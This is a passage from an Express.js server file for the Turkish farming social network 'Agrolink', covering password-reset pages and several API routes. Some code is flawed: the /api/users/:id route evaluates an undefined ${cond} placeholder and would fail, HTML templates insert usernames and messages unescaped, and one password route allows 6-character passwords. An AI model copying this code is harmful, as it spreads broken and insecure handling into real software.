            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        .alert-success { background: #e8f5e9; border-left-color: #4caf50; }
        .alert-error   { background: #ffebee; border-left-color: #f44336; }
        .form-group { margin-bottom: 20px; }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
        }
        .form-group input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        .form-group input:focus { outline: none; border-color: #4caf50; }
        .username-display {
            background: #f5f5f5;
            padding: 14px 16px;
            border-radius: 8px;
            font-size: 16px;
            color: #666;
            border: 2px solid #e0e0e0;
        }
        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #2e7d32, #4caf50);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 4px 15px rgba(46,125,50,0.3); }
        .btn:disabled { background: #ccc; cursor: not-allowed; transform: none; box-shadow: none; }
        .footer {
            text-align: center;
            padding: 20px;
            background: #f5f5f5;
            color: #666;
            font-size: 12px;
        }
        .password-strength { height: 4px; background: #e0e0e0; border-radius: 2px; margin-top: 8px; overflow: hidden; }
        .password-strength-bar { height: 100%; width: 0%; transition: width 0.3s, background 0.3s; }
        .strength-weak   { background: #f44336; width: 33%; }
        .strength-medium { background: #ff9800; width: 66%; }
        .strength-strong { background: #4caf50; width: 100%; }
        #result { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="icon">🔐</div>
            <h1>Şifre Sıfırlama</h1>
            <p>Hesabınızı korumak için yeni bir şifre belirleyin</p>
        </div>

        <div class="content">
            <div class="alert" style="background:#ffebee;border-left-color:#f44336;">
                <strong>⏱️ DİKKAT: Bu sayfa sadece 10 dakika geçerlidir!</strong><br>
                10 dakika içinde şifrenizi değiştirmezseniz bu link geçersiz olacak ve yeni bir link talep etmeniz gerekecektir.
            </div>

            <div class="alert">
                <strong>⚠️ Güvenlik Önlemi Alındı!</strong><br>
                Tüm aktif oturumlarınız sonlandırıldı.
            </div>

            <div id="result"></div>

            <form id="resetForm">
                <div class="form-group">
                    <label>Kullanıcı Adı</label>
                    <div class="username-display">@${username}</div>
                    <input type="hidden" id="username" value="${username}">
                    <input type="hidden" id="resetToken" value="${resetToken}">
                </div>

                <div class="form-group">
                    <label for="newPassword">Yeni Şifre</label>
                    <input type="password" id="newPassword" placeholder="En az 8 karakter" required minlength="8">
                    <div class="password-strength">
                        <div class="password-strength-bar" id="strengthBar"></div>
                    </div>
                </div>

                <div class="form-group">
                    <label for="confirmPassword">Şifre Tekrar</label>
                    <input type="password" id="confirmPassword" placeholder="Şifrenizi tekrar girin" required>
                </div>

                <button type="submit" class="btn" id="submitBtn">🔒 Şifremi Değiştir</button>
            </form>
        </div>

        <div class="footer">
            <p>🌾 Agrolink - Güvenli Tarım Topluluğu</p>
            <p>&copy; ${new Date().getFullYear()} Tüm hakları saklıdır.</p>
        </div>
    </div>

    <script>
        const newPasswordInput   = document.getElementById('newPassword');
        const confirmPasswordInput = document.getElementById('confirmPassword');
        const strengthBar        = document.getElementById('strengthBar');
        const form               = document.getElementById('resetForm');
        const resultDiv          = document.getElementById('result');
        const submitBtn          = document.getElementById('submitBtn');

        newPasswordInput.addEventListener('input', function() {
            const p = this.value;
            strengthBar.className = 'password-strength-bar';
            if (p.length >= 10 && /[A-Z]/.test(p) && /[0-9]/.test(p)) {
                strengthBar.classList.add('strength-strong');
            } else if (p.length >= 8) {
                strengthBar.classList.add('strength-medium');
            } else if (p.length > 0) {
                strengthBar.classList.add('strength-weak');
            }
        });

        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            const username        = document.getElementById('username').value;
            const resetToken      = document.getElementById('resetToken').value;
            const newPassword     = newPasswordInput.value;
            const confirmPassword = confirmPasswordInput.value;

            if (newPassword !== confirmPassword) { showResult('error', 'Şifreler eşleşmiyor!'); return; }
            if (newPassword.length < 8)          { showResult('error', 'Şifre en az 8 karakter olmalıdır!'); return; }

            submitBtn.disabled     = true;
            submitBtn.textContent  = '⏳ İşleniyor...';

            try {
                const response = await fetch('/api/auth/reset-password-with-token', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, resetToken, newPassword, confirmPassword })
                });
                const data = await response.json();

                if (response.ok && data.success) {
                    showResult('success', '✅ Şifreniz başarıyla değiştirildi! Artık yeni şifrenizle giriş yapabilirsiniz.');
                    form.style.display = 'none';
                    setTimeout(() => { window.location.href = '/'; }, 3000);
                } else {
                    showResult('error', data.error || 'Bir hata oluştu');
                    submitBtn.disabled    = false;
                    submitBtn.textContent = '🔒 Şifremi Değiştir';
                }
            } catch (err) {
                showResult('error', 'Bağlantı hatası. Lütfen tekrar deneyin.');
                submitBtn.disabled    = false;
                submitBtn.textContent = '🔒 Şifremi Değiştir';
            }
        });

        function showResult(type, message) {
            resultDiv.style.display = 'block';
            resultDiv.className     = 'alert alert-' + type;
            resultDiv.innerHTML     = message;
        }
    </script>
</body>
</html>`;
}

function getErrorPageHtml(title, message) {
    return `<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${title} - Agrolink</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, sans-serif;
            background: linear-gradient(135deg, #d32f2f, #f44336);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 16px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .icon { font-size: 64px; margin-bottom: 20px; }
        h1 { color: #d32f2f; margin-bottom: 15px; }
        p  { color: #666; margin-bottom: 25px; }
        a  {
            display: inline-block;
            background: #4caf50;
            color: white;
            padding: 12px 30px;
            border-radius: 8px;
            text-decoration: none;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">❌</div>
        <h1>${title}</h1>
        <p>${message}</p>
        <a href="/">Ana Sayfaya Dön</a>
    </div>
</body>
</html>`;
}

// ─── ŞIFRE SIFIRLA DİREKT LİNK: GET /api/auth/reset-password-direct ─
app.get('/api/auth/reset-password-direct', async (req, res) => {
    const token = typeof req.query.token === 'string' ? req.query.token.trim() : null;

    if (!token || !/^[a-f0-9]{64}$/i.test(token)) {
        return res.type('html').send(getErrorPageHtml('Geçersiz Bağlantı', 'Bu link artık geçerli değil.'));
    }

    // 🔒 DB'de token hash'i saklıyoruz — ham token ile değil, sha256 ile ara
    const tokenHash = crypto.createHash('sha256').update(token).digest('hex');

    try {
        // Önce password_resets tablosuna bak (forgot-password akışı)
        let record = await dbGet(
            `SELECT pr."userId", u.username FROM password_resets pr
             JOIN users u ON pr."userId" = u.id
             WHERE pr.token = $1 AND pr.used = FALSE AND pr."expiresAt" > NOW()
             LIMIT 1`,
            [tokenHash]
        ).catch(() => null);

        // Bulunamazsa suspicious_login_reports tablosuna bak (not-me akışı)
        if (!record) {
            record = await dbGet(
                `SELECT slr."userId", u.username FROM suspicious_login_reports slr
                 JOIN users u ON slr."userId" = u.id
                 WHERE slr."passwordResetToken" = $1 AND slr."tokenExpiresAt" > NOW()
                 LIMIT 1`,
                [token]
            ).catch(() => null);
        }

        if (!record) {
            return res.type('html').send(getErrorPageHtml(
                'Link Süresi Doldu',
                'Bu şifre sıfırlama linki süresi dolmuş veya daha önce kullanılmış.'
            ));
        }

        console.log(`🔐 Şifre sıfırlama sayfası açıldı: @${record.username}`);
        res.setHeader('Cache-Control', 'no-store');
        res.setHeader('Referrer-Policy', 'no-referrer');
        res.type('html').send(getPasswordResetPageHtml(record.username, token));

    } catch (e) {
        console.error('Şifre sıfırlama direkt link hatası:', e);
        res.type('html').send(getErrorPageHtml('Sunucu Hatası', 'Bir hata oluştu. Lütfen daha sonra tekrar deneyin.'));
    }
});


// ==================== 15 KRİTİK EKSİK ROTA ====================

// ─── 1. KULLANICI PROFİLİ (ID ile): GET /api/users/:id ────────────
// NOT: /api/users/:username zaten var; bu UUID/ID ile çalışır
app.get('/api/users/:id/profile', authenticateToken, async (req, res) => {
    try {
        const user = await dbGet(`
            SELECT u.id, u.username, u.name, u."profilePic", u."coverPic", u.bio, u.location,
                   u.website, u."isVerified", u."hasFarmerBadge", u."userType", u."isOnline",
                   u."lastSeen", u."createdAt", u."isPrivate",
                   (SELECT COUNT(*) FROM posts   WHERE "userId"=u.id AND "isActive"=TRUE) AS "postCount",
                   (SELECT COUNT(*) FROM follows WHERE "followingId"=u.id)                AS "followerCount",
                   (SELECT COUNT(*) FROM follows WHERE "followerId"=u.id)                 AS "followingCount",
                   EXISTS(SELECT 1 FROM follows WHERE "followerId"=$1 AND "followingId"=u.id) AS "isFollowing",
                   EXISTS(SELECT 1 FROM blocks  WHERE ("blockerId"=$1 AND "blockedId"=u.id) OR ("blockerId"=u.id AND "blockedId"=$1)) AS "isBlocked"
            FROM users u WHERE u.id=$2 AND u."isActive"=TRUE`, [req.user.id, req.params.id]);
        if (!user) return res.status(404).json({ error: 'Kullanıcı bulunamadı' });
        // 🔒 ENGEL KONTROLÜ
        if (user.isBlocked && user.id !== req.user.id) {
            return res.status(403).json({ error: 'Engelli kullanıcı' });
        }
        const isSelf      = user.id === req.user.id;
        const isFollowing = user.isFollowing;
        // 🔒 GİZLİ HESAP KONTROLÜ — takipçi değilse sadece temel bilgi git
        if (user.isPrivate && !isSelf && !isFollowing) {
            console.log(`[GİZLİ HESAP] userId=${req.user.id} → hedef=${user.id} (${user.username}) — kısıtlı profil`);
            return res.json({
                user: {
                    id          : user.id,
                    username    : user.username,
                    name        : user.name,
                    profilePic  : user.profilePic,
                    isVerified  : user.isVerified,
                    hasFarmerBadge: user.hasFarmerBadge,
                    isPrivate   : true,
                    isFollowing : false,
                    postCount   : 0,
                    followerCount: 0,
                    followingCount: 0,
                },
            });
        }
        const { password: _, ...safe } = user;
        res.json({ user: safe });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── 2. KULLANICI GÖNDERİLERİ: GET /api/users/:id/posts ───────────
// MEVCUT /api/users/:userId/posts'tan farklı path uyumluluğu için
// (zaten var ama /api/users/:userId/posts olarak - bu da çalışsın)
// Bu rota zaten mevcut, alias tanımla:

// ─── 3. ŞİFRE SIFIRLAMA (TOKEN ile): POST /api/auth/reset-password-with-token
app.post('/api/auth/reset-password-with-token', async (req, res) => {
    try {
        const { username, resetToken, newPassword, confirmPassword } = req.body;
        const ip = req.ip || req.connection?.remoteAddress;

        if (!username || !resetToken || !newPassword || !confirmPassword)
            return res.status(400).json({ error: 'Tüm alanlar zorunludur' });
        if (newPassword !== confirmPassword)
            return res.status(400).json({ error: 'Şifreler eşleşmiyor' });
        if (newPassword.length < 8)
            return res.status(400).json({ error: 'Şifre en az 8 karakter olmalıdır' });

        // 🔒 DB'de token hash'i saklanıyor — ham token yerine sha256 ile ara
        const resetTokenHash = crypto.createHash('sha256').update(resetToken).digest('hex');

        const cleanUsername = username.toLowerCase().trim();
        const user = await dbGet(
            `SELECT * FROM users WHERE LOWER(username) = $1 AND "isActive" = TRUE`,
            [cleanUsername]
        );
        if (!user) return res.status(404).json({ error: 'Kullanıcı bulunamadı' });

        // ✅ Önce password_resets tablosuna bak (forgot-password akışı)
        let tokenRecord = await dbGet(
            `SELECT id FROM password_resets
             WHERE "userId" = $1 AND token = $2 AND used = FALSE AND "expiresAt" > NOW()`,
            [user.id, resetTokenHash]
        ).catch(() => null);
        let tokenSource = 'password_resets';

        // Bulunamazsa suspicious_login_reports tablosuna bak (not-me akışı)
        if (!tokenRecord) {
            tokenRecord = await dbGet(
                `SELECT id, "reportedIp" FROM suspicious_login_reports
                 WHERE "userId" = $1 AND "passwordResetToken" = $2 AND "tokenExpiresAt" > NOW()
                 ORDER BY "reportedAt" DESC LIMIT 1`,
                [user.id, resetToken]
            ).catch(() => null);
            tokenSource = 'suspicious_login_reports';
        }

        if (!tokenRecord) return res.status(400).json({ error: 'Geçersiz veya süresi dolmuş token' });

        // Yeni şifreyi hashle ve güncelle
        const hashed = await bcrypt.hash(newPassword, BCRYPT_ROUNDS);
        await dbRun(`UPDATE users SET password = $1, "updatedAt" = NOW() WHERE id = $2`, [hashed, user.id]);

        // 🔒 Tüm oturumları ve refresh token'ları geçersiz kıl
        await Promise.all([
            dbRun(`UPDATE refresh_tokens SET "isActive" = FALSE WHERE "userId" = $1`, [user.id]).catch(() => {}),
            dbRun(`UPDATE active_sessions SET "isActive" = FALSE WHERE "userId" = $1`, [user.id]).catch(() => {}),
        ]);
        console.log(`🔒 Tüm oturumlar sonlandırıldı: ${user.username}`);

        // Token'ı kullanıldı olarak işaretle
        if (tokenSource === 'password_resets') {
            await dbRun(`UPDATE password_resets SET used = TRUE WHERE id = $1`, [tokenRecord.id]).catch(() => {});
        } else {
            await dbRun(
                `UPDATE suspicious_login_reports SET "isResolved" = TRUE, "resolvedAt" = NOW() WHERE id = $1`,
                [tokenRecord.id]
            ).catch(() => {});
            // IP ban'ını kaldır
            if (tokenRecord.reportedIp) {
                await dbRun(`DELETE FROM banned_ips WHERE ip = $1`, [tokenRecord.reportedIp]).catch(() => {});
                console.log(`✅ Şifre sıfırlandı ve IP ban kaldırıldı: ${user.username} - IP: ${tokenRecord.reportedIp}`);
            }
        }

        // 📧 Başarılı şifre sıfırlama e-postası gönder
        sendPasswordResetSuccessEmail(user.email, user.name).catch(() => {});

        // Yeni JWT token oluştur ve dön
        const tokens = generateTokens(user);
        const { password: _, ...safeUser } = user;

        res.json({
            success: true,
            message: 'Şifre başarıyla değiştirildi. Artık yeni şifrenizle giriş yapabilirsiniz.',
            token: tokens.accessToken,
            refreshToken: tokens.refreshToken,
            user: safeUser,
            ipUnbanned: tokenSource === 'suspicious_login_reports'
        });
    } catch (e) {
        console.error('Şifre sıfırlama (token) hatası:', e);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 4. GÖNDERI MESAJDA PAYLAŞ: POST /api/messages/share-post ──────
app.post('/api/messages/share-post', authenticateToken, async (req, res) => {
    try {
        const { postId, recipientId } = req.body;
        if (!postId || !recipientId) return res.status(400).json({ error: 'postId ve recipientId gerekli' });

        const [post, recipient, sender] = await Promise.all([
            dbGet('SELECT id FROM posts WHERE id=$1 AND "isActive"=TRUE', [postId]),
            dbGet('SELECT id,username FROM users WHERE id=$1 AND "isActive"=TRUE', [recipientId]),
            dbGet('SELECT username FROM users WHERE id=$1', [req.user.id])
        ]);
        if (!post) return res.status(404).json({ error: 'Gönderi bulunamadı' });
        if (!recipient) return res.status(404).json({ error: 'Alıcı bulunamadı' });

        const blocked = await dbGet(
            'SELECT id FROM blocks WHERE ("blockerId"=$1 AND "blockedId"=$2) OR ("blockerId"=$2 AND "blockedId"=$1)',
            [req.user.id, recipientId]);
        if (blocked) return res.status(403).json({ error: 'Bu kullanıcıya mesaj gönderemezsiniz' });

        const msgId = uuidv4();
        const postUrl = `/p/${postId}`;
        await dbRun(
            `INSERT INTO messages (id,"senderId","senderUsername","recipientId","recipientUsername",content,read,"createdAt","updatedAt")
             VALUES ($1,$2,$3,$4,$5,$6,FALSE,NOW(),NOW())`,
            [msgId, req.user.id, sender.username, recipientId, recipient.username, `📷 Paylaşılan Gönderi: ${postUrl}`]);

        res.json({ message: 'Gönderi paylaşıldı', messageId: msgId });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── 5. BİLDİRİMLERİ OKU (POST alias): POST /api/notifications/read
app.post('/api/notifications/read', authenticateToken, async (req, res) => {
    try {
        const { ids } = req.body;
        if (ids && Array.isArray(ids) && ids.length > 0) {
            const ph = ids.map((_,i)=>`$${i+2}`).join(',');
            await dbRun(`UPDATE notifications SET read=TRUE,"readAt"=NOW() WHERE id IN (${ph}) AND "userId"=$1`,
                [req.user.id, ...ids]);
        } else {
            await dbRun('UPDATE notifications SET read=TRUE,"readAt"=NOW() WHERE "userId"=$1', [req.user.id]);
        }
        res.json({ message: 'Bildirimler okundu olarak işaretlendi' });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── 6. ANKET OY VER: POST /api/posts/:postId/poll/vote ────────────
app.post('/api/posts/:postId/poll/vote', authenticateToken, async (req, res) => {
    try {
        const { postId } = req.params;
        const { optionId, optionIndex: optIdx } = req.body;
        if (optionId === undefined && optIdx === undefined)
            return res.status(400).json({ error: 'Şık seçimi gereklidir' });

        const post = await dbGet('SELECT * FROM posts WHERE id=$1 AND "isPoll"=TRUE', [postId]);
        if (!post) return res.status(404).json({ error: 'Anket bulunamadı' });

        const existing = await dbGet('SELECT id FROM poll_votes WHERE "postId"=$1 AND "userId"=$2',
            [postId, req.user.id]).catch(()=>null);
        if (existing) return res.status(400).json({ error: 'Bu ankete zaten oy verdiniz' });

        let pollOptions = typeof post.pollOptions === 'string'
            ? JSON.parse(post.pollOptions) : (post.pollOptions || []);

        const idx = optIdx !== undefined
            ? parseInt(optIdx)
            : pollOptions.findIndex(o => o.id === parseInt(optionId));

        if (idx < 0 || idx >= pollOptions.length)
            return res.status(400).json({ error: 'Geçersiz şık' });

        pollOptions[idx].votes = (pollOptions[idx].votes || 0) + 1;

        await dbRun('UPDATE posts SET "pollOptions"=$1,"updatedAt"=NOW() WHERE id=$2',
            [JSON.stringify(pollOptions), postId]);

        await dbRun(`CREATE TABLE IF NOT EXISTS poll_votes (id UUID PRIMARY KEY, "postId" UUID, "userId" UUID, "optionId" TEXT, "createdAt" TIMESTAMPTZ DEFAULT NOW(), UNIQUE("postId","userId"))`).catch(()=>{});
        await dbRun('INSERT INTO poll_votes (id,"postId","userId","optionId","createdAt") VALUES ($1,$2,$3,$4,NOW()) ON CONFLICT DO NOTHING',
            [uuidv4(), postId, req.user.id, String(optionId ?? idx)]).catch(()=>{});

        res.json({ success: true, pollOptions, message: 'Oyunuz kaydedildi' });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── 7. PUBLIC POST ÖNIZLEME: /p/:id rotası yukarıda (6430. satır) tanımlandı, çakışmayı önlemek için bu yedek kaldırıldı ───────────────────────────
// ─── 9. PUSH UNSUBSCRIBE: POST /api/push/unsubscribe ───────────────
app.post('/api/push/unsubscribe', authenticateToken, async (req, res) => {
    try {
        const { endpoint } = req.body;
        if (endpoint) {
            await dbRun('DELETE FROM push_subscriptions WHERE "userId"=$1 AND endpoint=$2',
                [req.user.id, endpoint]).catch(()=>{});
        } else {
            await dbRun('DELETE FROM push_subscriptions WHERE "userId"=$1', [req.user.id]).catch(()=>{});
        }
        res.json({ message: 'Push aboneliği iptal edildi' });
    } catch (e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── 10. PUSH TEST: POST /api/push/test ────────────────────────────
app.post('/api/push/test', authenticateToken, async (req, res) => {
    try {
        if (!webpush || !process.env.VAPID_PUBLIC_KEY) {
            return res.json({ message: 'Web-push yapılandırılmamış', sent: false, note: 'VAPID_PUBLIC_KEY ve VAPID_PRIVATE_KEY .env dosyasına ekleyin, ardından npm install web-push' });
        }
        sendPushToUser(req.user.id, {
            title: '🌾 AgroLink Test Bildirimi',
            body: 'Push bildirimleri başarıyla çalışıyor!',
            icon: '/agro.png',
            url: '/'
        });
        res.json({ message: 'Test bildirimi gönderildi', sent: true });
    } catch (e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── 11. HESAP SİL (alias DELETE): DELETE /api/users/delete ────────
app.delete('/api/users/delete', authenticateToken, async (req, res) => {
    try {
        const { password } = req.body;
        if (!password) return res.status(400).json({ error: 'Şifre gerekli' });
        const user = await dbGet('SELECT password FROM users WHERE id=$1', [req.user.id]);
        const valid = await bcrypt.compare(password, user.password);
        if (!valid) return res.status(401).json({ error: 'E-posta/kullanıcı adı veya şifre hatalı' });
        await dbRun('UPDATE users SET "isActive"=FALSE,"updatedAt"=NOW() WHERE id=$1', [req.user.id]);
        await dbRun('DELETE FROM refresh_tokens WHERE "userId"=$1', [req.user.id]).catch(()=>{});
        res.json({ message: 'Hesap silindi' });
    } catch (e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── 12. TOPLU POST GÖRÜNTÜLEME: POST /api/posts/batch-view ─────────
app.post('/api/posts/batch-view', authenticateToken, async (req, res) => {
    try {
        const { postIds } = req.body;
        if (!postIds || !Array.isArray(postIds) || postIds.length === 0)
            return res.status(400).json({ error: 'postIds dizisi gerekli' });
        // Her post için akıllı view tracking: aynı kullanıcı aynı günde tekrar sayılmaz, kendi postunu saymaz
        for (const postId of postIds.slice(0, 50)) {
            try {
                const post = await dbGet('SELECT "userId" FROM posts WHERE id=$1 AND "isActive"=TRUE', [postId]);
                if (post && post.userId !== req.user.id) {
                    await incrementPostView(postId, req.user.id, null);
                }
            } catch (e) { /* devam et */ }
        }
        res.json({ message: 'Görüntülemeler kaydedildi', count: postIds.length });
    } catch (e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── 13. GRUP SOHBETLERİ: GET /api/chats/groups ────────────────────
app.get('/api/chats/groups', authenticateToken, async (req, res) => {
    try {
        const groups = await dbAll(`
            SELECT gc.*, gm.role, u.name AS "creatorName"
            FROM group_chats gc
            JOIN group_members gm ON gm."groupId"=gc.id AND gm."userId"=$1
            LEFT JOIN users u ON gc."creatorId"=u.id
            ORDER BY gc."createdAt" DESC`, [req.user.id]).catch(()=>[]);
        res.json({ groups });
    } catch (e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── 14. GRUP SOHBET OLUŞTUR: POST /api/chats/group ─────────────────
app.post('/api/chats/group', authenticateToken, upload.single('photo'), async (req, res) => {
    try {
        const { name, memberIds } = req.body;
        if (!name) return res.status(400).json({ error: 'Grup adı gerekli' });

        const members = typeof memberIds === 'string' ? JSON.parse(memberIds) : (memberIds || []);
        const groupId = uuidv4();

        let photoUrl = null;
        if (req.file) {
            const fname = `group_${groupId}_${Date.now()}.webp`;
            const out = require('path').join(profilesDir, fname);
            await processImage(req.file.path, out, { width: 256, height: 256, fit: 'cover', quality: 65, effort: 3 });
            await require('fs').promises.unlink(req.file.path).catch(()=>{});
            photoUrl = `/uploads/profiles/${fname}`;
        }

        // group_chats tablosu yoksa oluştur
        await dbRun(`CREATE TABLE IF NOT EXISTS group_chats (id UUID PRIMARY KEY, name TEXT, photo TEXT, "creatorId" UUID, "createdAt" TIMESTAMPTZ DEFAULT NOW())`).catch(()=>{});
        await dbRun(`CREATE TABLE IF NOT EXISTS group_members (id UUID PRIMARY KEY, "groupId" UUID, "userId" UUID, role TEXT DEFAULT 'member', "joinedAt" TIMESTAMPTZ DEFAULT NOW(), UNIQUE("groupId","userId"))`).catch(()=>{});

        await dbRun('INSERT INTO group_chats (id,name,photo,"creatorId","createdAt") VALUES ($1,$2,$3,$4,NOW())',
            [groupId, name.substring(0,100), photoUrl, req.user.id]);

        const allMembers = [...new Set([req.user.id, ...members])];
        for (const uid of allMembers) {
            const role = uid === req.user.id ? 'admin' : 'member';
            await dbRun('INSERT INTO group_members (id,"groupId","userId",role,"joinedAt") VALUES ($1,$2,$3,$4,NOW()) ON CONFLICT DO NOTHING',
                [uuidv4(), groupId, uid, role]).catch(()=>{});
        }

        res.status(201).json({ message: 'Grup oluşturuldu', groupId, name, photo: photoUrl });
    } catch (e) {
        if (req.file) require('fs').promises.unlink(req.file.path).catch(()=>{});
        console.error(e); res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 15. VİDEO THUMBNAIL (alias): GET /api/videos/thumbnail/:filename
app.get('/api/videos/thumbnail/:filename', authenticateToken, (req, res) => {
    // 🔒 Path traversal koruması + dizin dışı erişim engeli
    const safeFile = sanitizeFilename(req.params.filename);
    if (!safeFile) return res.status(400).json({ error: 'Geçersiz dosya adı' });
    const thumbPath = path.join(thumbnailsDir, safeFile);
    if (!thumbPath.startsWith(thumbnailsDir + path.sep)) return res.status(403).json({ error: 'Erişim reddedildi' });
    const fss = require('fs');
    if (fss.existsSync(thumbPath)) {
        res.sendFile(thumbPath);
    } else {
        // Default thumbnail
        const def = path.join(uploadsDir, 'default-video-thumb.jpg');
        if (fss.existsSync(def)) return res.sendFile(def);
        res.status(404).json({ error: 'Thumbnail bulunamadı' });
    }
});


// ==================== KALAN EKSİK ROTALAR ====================

// GET /api/users/:id  (UUID/id ile profil lookup)
app.get('/api/users/:id', authenticateToken, async (req, res) => {
    try {
        const param = req.params.id;
        const isUUID = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(param);
        const sql = `
            SELECT u.id, u.username, u.name, u."profilePic", u."coverPic", u.bio, u.location,
                   u.website, u."isVerified", u."hasFarmerBadge", u."userType", u."isOnline",
                   u."lastSeen", u."createdAt",
                   (SELECT COUNT(*) FROM posts   WHERE "userId"=u.id AND "isActive"=TRUE) AS "postCount",
                   (SELECT COUNT(*) FROM follows WHERE "followingId"=u.id)                AS "followerCount",
                   (SELECT COUNT(*) FROM follows WHERE "followerId"=u.id)                 AS "followingCount",
                   EXISTS(SELECT 1 FROM follows WHERE "followerId"=$1 AND "followingId"=u.id) AS "isFollowing",
                   EXISTS(SELECT 1 FROM blocks  WHERE "blockerId"=$1 AND "blockedId"=u.id)   AS "isBlocked"
            FROM users u WHERE ${cond} AND u."isActive"=TRUE
        `;
        const finalSql = sql.replace('${cond}', isUUID ? 'u.id=$2' : 'u.username=$2');
        const user = await dbGet(finalSql, [req.user.id, param]);
        if (!user) return res.status(404).json({ error: 'Kullanıcı bulunamadı' });
        const { password: _, ...safe } = user;
        res.json({ user: safe });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});


// GET /api/users/:id/posts  (id ile kullanıcı gönderileri)
app.get('/api/users/:id/posts', authenticateToken, async (req, res) => {
    try {
        const { page=1, limit=12 } = req.query;
        const pn = Math.max(1, parseInt(page)||1);
        const ln = Math.min(parseInt(limit)||12, 50);
        const off = (pn-1)*ln;
        const userId = req.params.id;

        const target = await dbGet('SELECT id,"isPrivate" FROM users WHERE id=$1 AND "isActive"=TRUE', [userId]);
        if (!target) return res.status(404).json({ error: 'Kullanıcı bulunamadı' });

        if (target.isPrivate && userId !== req.user.id) {
            const follows = await dbGet('SELECT id FROM follows WHERE "followerId"=$1 AND "followingId"=$2',
                [req.user.id, userId]);
            if (!follows) return res.status(403).json({ error: 'Bu profili görüntüleme izniniz yok' });
        }

        const posts = await dbAll(`
            SELECT p.*, u."profilePic" AS "userProfilePic", u.name AS "userName", u.username,
                   u."isVerified" AS "userVerified",
                   EXISTS(SELECT 1 FROM likes WHERE "postId"=p.id AND "userId"=$1) AS "isLiked",
                   EXISTS(SELECT 1 FROM saves WHERE "postId"=p.id AND "userId"=$1) AS "isSaved"
            FROM posts p JOIN users u ON p."userId"=u.id
            WHERE p."userId"=$2 AND p."isActive"=TRUE
            ORDER BY p."createdAt" DESC LIMIT $3 OFFSET $4
        `, [req.user.id, userId, ln, off]);

        const tot = await dbGet('SELECT COUNT(*) AS c FROM posts WHERE "userId"=$1 AND "isActive"=TRUE', [userId]);
        res.json({
            posts,
            total: parseInt(tot?.c||0),
            page: pn,
            hasMore: pn * ln < parseInt(tot?.c||0),
            totalPages: Math.ceil((tot?.c||0)/ln)
        });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// GET /api/videos/:id/info  (video detay bilgisi)
app.get('/api/videos/:id/info', authenticateToken, async (req, res) => {
    try {
        const post = await dbGet(`
            SELECT p.*, u.username, u.name, u."profilePic", u."isVerified"
            FROM posts p JOIN users u ON p."userId"=u.id
            WHERE p.id=$1 AND p."mediaType"='video' AND p."isActive"=TRUE`, [req.params.id]);
        if (!post) return res.status(404).json({ error: 'Video bulunamadı' });
        res.json({ video: post });
    } catch (e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});

// POST /api/users/change-password (alias)
app.post('/api/users/change-password', authenticateToken, async (req, res) => {
    try {
        const { currentPassword, newPassword } = req.body;
        if (!currentPassword || !newPassword) return res.status(400).json({ error: 'Şifreler gerekli' });
        if (newPassword.length < 6) return res.status(400).json({ error: 'Şifre en az 6 karakter' });
        const user = await dbGet('SELECT password FROM users WHERE id=$1', [req.user.id]);
        const valid = await bcrypt.compare(currentPassword, user.password);
        if (!valid) return res.status(401).json({ error: 'Mevcut şifre yanlış' });
        const hashed = await bcrypt.hash(newPassword, BCRYPT_ROUNDS);
        await dbRun('UPDATE users SET password=$1,"updatedAt"=NOW() WHERE id=$2', [hashed, req.user.id]);
        res.json({ message: 'Şifre değiştirildi' });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// POST /api/products (alias - mağaza ürün ekle)
app.post('/api/products', authenticateToken, (req, res, next) => {
    upload.fields([{ name: 'images', maxCount: 5 }, { name: 'image', maxCount: 1 }])(req, res, (err) => {
        if (err) return res.status(400).json({ error: err.message });
        if (req.files && !Array.isArray(req.files)) {
            req.files = [...(req.files['images']||[]), ...(req.files['image']||[])];
        }
        next();
    });
}, async (req, res) => {
    try {
        const { name, price, description, category, stock } = req.body;
        if (!name || !price) return res.status(400).json({ error: 'İsim ve fiyat gerekli' });
        const files = Array.isArray(req.files) ? req.files : [];
        let images = [];
        for (let i = 0; i < files.length; i++) {
            const fname = `product_${Date.now()}_${i}.webp`;
            const out = require('path').join(postsDir, fname);
